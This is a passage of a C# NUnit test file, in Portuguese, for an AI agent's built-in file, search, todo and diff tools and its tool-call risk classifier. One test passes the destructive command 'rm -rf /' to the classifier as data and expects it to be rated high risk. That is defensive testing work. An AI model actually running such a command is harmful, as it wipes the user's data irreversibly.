            Args("{\"path\":\"e.txt\",\"old_string\":\"bbb\",\"new_string\":\"XXX\"}"), Ctx(), default);

        Assert.Multiple(() =>
        {
            Assert.That(File.ReadAllText(Path.Join(_workspace, "e.txt")), Is.EqualTo("aaa XXX ccc\n"));
            Assert.That(r.Text, Does.Contain("-aaa bbb ccc").And.Contain("+aaa XXX ccc"));
        });
    }

    [Test]
    public async Task FileEdit_AmbiguoSemReplaceAll_FalhaComDica()
    {
        File.WriteAllText(Path.Join(_workspace, "amb.txt"), "x x x\n");
        var tool = new FileEditBuiltinTool();

        var r = await tool.ExecuteAsync(
            Args("{\"path\":\"amb.txt\",\"old_string\":\"x\",\"new_string\":\"y\"}"), Ctx(), default);
        Assert.That(r.Text, Does.Contain("3×").And.Contain("replace_all"));

        var ok = await tool.ExecuteAsync(
            Args("{\"path\":\"amb.txt\",\"old_string\":\"x\",\"new_string\":\"y\",\"replace_all\":true}"),
            Ctx(), default);
        Assert.That(File.ReadAllText(Path.Join(_workspace, "amb.txt")), Is.EqualTo("y y y\n"));
        Assert.That(ok.Text, Does.Contain("editado"));
    }

    [Test]
    public async Task FileEdit_TrechoNaoEncontrado_RetornaDica()
    {
        File.WriteAllText(Path.Join(_workspace, "m.txt"), "conteudo\n");
        var tool = new FileEditBuiltinTool();
        var r = await tool.ExecuteAsync(
            Args("{\"path\":\"m.txt\",\"old_string\":\"inexistente\",\"new_string\":\"z\"}"), Ctx(), default);
        Assert.That(r.Text, Does.Contain("não encontrado").And.Contain("file_read"));
    }

    [Test]
    public async Task FileGrep_FileGlob_FileList_Funcionam()
    {
        Directory.CreateDirectory(Path.Join(_workspace, "sub"));
        File.WriteAllText(Path.Join(_workspace, "sub", "um.cs"), "class Foo {}\n// TODO: x\n");
        File.WriteAllText(Path.Join(_workspace, "dois.md"), "sem match\n");

        var grep = new FileGrepBuiltinTool();
        var g = await grep.ExecuteAsync(
            Args("{\"pattern\":\"todo\",\"glob\":\"*.cs\"}"), Ctx(), default);
        Assert.That(g.Text, Does.Contain("sub/um.cs:2:").And.Contain("TODO"));

        var glob = new FileGlobBuiltinTool();
        var m = await glob.ExecuteAsync(Args("{\"pattern\":\"**/*.md\"}"), Ctx(), default);
        Assert.That(m.Text, Does.Contain("dois.md").And.Not.Contain("um.cs"));

        var list = new FileListBuiltinTool();
        var l = await list.ExecuteAsync(Args("{\"recursive\":true}"), Ctx(), default);
        Assert.That(l.Text, Does.Contain("sub/").And.Contain("um.cs").And.Contain("dois.md"));
    }

    // ---------------- todo_write (P10) ----------------

    [Test]
    public async Task TodoWrite_SnapshotValido_RetornaTasks()
    {
        var tool = new TodoWriteBuiltinTool();
        var r = await tool.ExecuteAsync(
            Args("{\"todos\":[{\"content\":\"escrever spec\",\"status\":\"completed\"},"
                 + "{\"content\":\"implementar\",\"status\":\"in_progress\"},"
                 + "{\"content\":\"testar\",\"status\":\"pending\"}]}"),
            Ctx(), default);

        Assert.Multiple(() =>
        {
            Assert.That(r.Text, Does.Contain("3 tarefa(s)").And.Contain("1 concluída"));
            var tasks = r.Result!.GetType().GetProperty("tasks")!.GetValue(r.Result)
                as System.Collections.IEnumerable;
            Assert.That(tasks!.Cast<object>().Count(), Is.EqualTo(3));
        });
    }

    [Test]
    public async Task TodoWrite_ItemInvalido_RetornaErro()
    {
        var tool = new TodoWriteBuiltinTool();
        var r = await tool.ExecuteAsync(
            Args("{\"todos\":[{\"content\":\"x\",\"status\":\"blocked\"}]}"), Ctx(), default);
        Assert.That(r.Text, Does.Contain("pending|in_progress|completed"));
    }

    [Test]
    public void Diff_MudancaDeLinha_EmiteHunkUnificado()
    {
        var d = UnifiedDiff.Compute("a.txt", "one\ntwo\nthree", "one\nTWO\nthree");
        Assert.Multiple(() =>
        {
            Assert.That(d.Added, Is.EqualTo(1));
            Assert.That(d.Removed, Is.EqualTo(1));
            Assert.That(d.Text, Does.Contain("--- a/a.txt").And.Contain("-two").And.Contain("+TWO"));
        });
    }

    private sealed class StubHttpClientFactory(HttpMessageHandler? handler = null)
        : IHttpClientFactory
    {
        public HttpClient CreateClient(string name) =>
            handler is null ? new() : new HttpClient(handler);
    }

    // ---------------- ToolCallRiskClassifier (preset auto) ----------------

    [Test]
    public void Risk_ToolSomenteLeitura_EhLow()
    {
        var tool = new Tool { Url = "builtin://file_read" };
        Assert.That(ToolCallRiskClassifier.Classify(tool, "{}", _workspace),
            Is.EqualTo(ToolCallRisk.Low));
    }

    [Test]
    public void Risk_BuiltinsMutaveis_SaoMedium()
    {
        foreach (var name in new[]
        {
            "file_write", "file_edit", "generate_image", "code_interpreter", "job_kill",
        })
        {
            var tool = new Tool { Url = $"builtin://{name}", RequiresApproval = true };
            Assert.That(ToolCallRiskClassifier.Classify(tool, "{}", _workspace),
                Is.EqualTo(ToolCallRisk.Medium), name);
        }
    }

    [Test]
    public void Risk_ShellExec_ClassificaPeloComando()
    {
        var tool = new Tool { Url = "builtin://shell_exec", RequiresApproval = true };
        Assert.Multiple(() =>
        {
            Assert.That(ToolCallRiskClassifier.Classify(
                    tool, "{\"command\":\"ls -la\"}", _workspace),
                Is.EqualTo(ToolCallRisk.Low));
            Assert.That(ToolCallRiskClassifier.Classify(
                    tool, "{\"command\":\"echo oi > a.txt\"}", _workspace),
                Is.EqualTo(ToolCallRisk.Medium));
            Assert.That(ToolCallRiskClassifier.Classify(
                    tool, "{\"command\":\"rm -rf /\"}", _workspace),
                Is.EqualTo(ToolCallRisk.High));
            Assert.That(ToolCallRiskClassifier.Classify(
                    tool, "{\"command\":\"ls\",\"background\":true}", _workspace),
                Is.EqualTo(ToolCallRisk.High));
        });
    }

    [Test]
    public void Risk_McpECustom_SaoHigh()
    {
        var mcp = new Tool { Url = "mcp://srv-1/eco" };
        var http = new Tool { Url = "http://x/tool", RequiresApproval = true };
        var python = new Tool { Url = "http://x/tool", Code = "print(1)" };
        Assert.Multiple(() =>
        {
            Assert.That(ToolCallRiskClassifier.Classify(mcp, "{}", _workspace),
                Is.EqualTo(ToolCallRisk.High));
            Assert.That(ToolCallRiskClassifier.Classify(http, "{}", _workspace),
                Is.EqualTo(ToolCallRisk.High));
            Assert.That(ToolCallRiskClassifier.Classify(python, "{}", _workspace),
                Is.EqualTo(ToolCallRisk.High));
        });
    }

    private sealed class FakeHandler(HttpStatusCode status, string content, string mediaType)
        : HttpMessageHandler
    {
        protected override Task<HttpResponseMessage> SendAsync(
            HttpRequestMessage request, CancellationToken cancellationToken) =>
            Task.FromResult(new HttpResponseMessage(status)
            {
                Content = new StringContent(
                    content, System.Text.Encoding.UTF8, mediaType),
            });
    }

    private sealed class ThrowingHandler : HttpMessageHandler
    {
        protected override Task<HttpResponseMessage> SendAsync(
            HttpRequestMessage request, CancellationToken cancellationToken) =>
            throw new HttpRequestException("conexão recusada");
    }
}
